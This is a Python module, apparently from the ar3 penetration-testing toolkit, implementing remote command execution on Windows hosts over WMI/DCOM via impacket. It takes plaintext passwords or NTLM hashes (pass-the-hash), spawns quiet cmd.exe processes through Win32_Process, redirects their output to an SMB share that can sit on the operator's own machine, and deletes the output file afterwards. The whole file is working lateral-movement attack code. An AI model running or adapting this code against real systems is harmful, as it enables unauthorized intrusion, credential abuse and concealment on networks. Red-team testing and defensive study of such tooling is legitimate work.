import os
from time import sleep
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcomrt import DCOMConnection

from ar3.helpers.misc import gen_random_string, get_local_ip

class WMIEXEC():
    def __init__(self, logger, host, args, smb_con, share_name=False):
        self.outfile    = gen_random_string()
        self.debug      = args.debug
        self.logger     = logger
        self.host       = host
        self.domain     = args.domain
        self.username   = args.user
        self.password   = args.passwd

        self.hash   = args.hash
        self.lmhash = ''
        self.nthash = ''


        self.pwd          = str('C:\\')
        self.shell        = 'cmd.exe /Q /c '
        self.noOutput     = args.no_output
        self.outputBuffer = ''

        self.timeout         = args.timeout
        self.smbcon          = smb_con
        self.fileless_output = False

        if share_name:
            # Fileless output
            self.fileless_output = True
            self.ip              = get_local_ip()
            self.share           = share_name
            self.path            = "\\"
        else:
            # Filed or Remote output
            self.ip     = args.exec_ip
            self.share  = args.exec_share
            self.path   = args.exec_path

        if self.hash:
            try:
                self.lmhash, self.nthash = self.hash.split(':')
            except:
                self.nthash = self.hash

    def create_wmi_con(self):
        self.dcom = DCOMConnection(self.host, self.username, self.password, self.domain, self.lmhash, self.nthash)
        iInterface = self.dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices = iWbemLevel1Login.NTLMLogin('\\\\{}\\root\\cimv2'.format(self.host), NULL, NULL)
        iWbemLevel1Login.RemRelease()
        self.win32Process, _ = iWbemServices.GetObject('Win32_Process')


    def execute(self, command):
        self.create_wmi_con()
        self.logger.debug( "WMIExec: DCOM connection created")

        # Init New Command
        self.__outputBuffer = ''

        if self.noOutput:
            cmd = self.shell + command
        else:
            cmd = self.shell + command + " 1> \\\\{}\\{}{} 2>&1".format(self.ip, self.share, self.path + self.outfile)
        self.logger.debug( "WMIexec: {}".format(cmd))

        self.win32Process.Create(cmd, self.pwd, None)
        self.logger.debug( "Win32 Process Created")

        # Get output
        if self.noOutput:
            self.__outputBuffer = "Command executed with no output"
        elif self.fileless_output:
            self.get_output_fileless()
        else:
            self.get_output()

        self.logger.debug( "Disconnecting win32 process")
        self.dcom.disconnect()
        return self.__outputBuffer


    def get_output(self, CODEC='UTF-8'):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        while True:
            try:
                self.smbcon.con.getFile(self.share, "{}{}".format(self.path, self.outfile), output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >= 0:
                    # Output not finished, let's wait
                    sleep(1)

                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    self.logger.debug( 'Connection broken, trying to recreate it')
                    self.smbcon.con.reconnect()
                    return self.get_output()
        # Cleanup, delete tmp outfile
        self.smbcon.con.deleteFile(self.share, "{}{}".format(self.path.replace('\\','/'), self.outfile))

    def get_output_fileless(self):
        def output_callback_fileless(data):
            self.__outputBuffer += data
        while True:
            try:
                with open(os.path.join('/tmp', '.ar3', self.outfile), 'r') as output:
                    output_callback_fileless(output.read())
                break
            except IOError:
                sleep(2)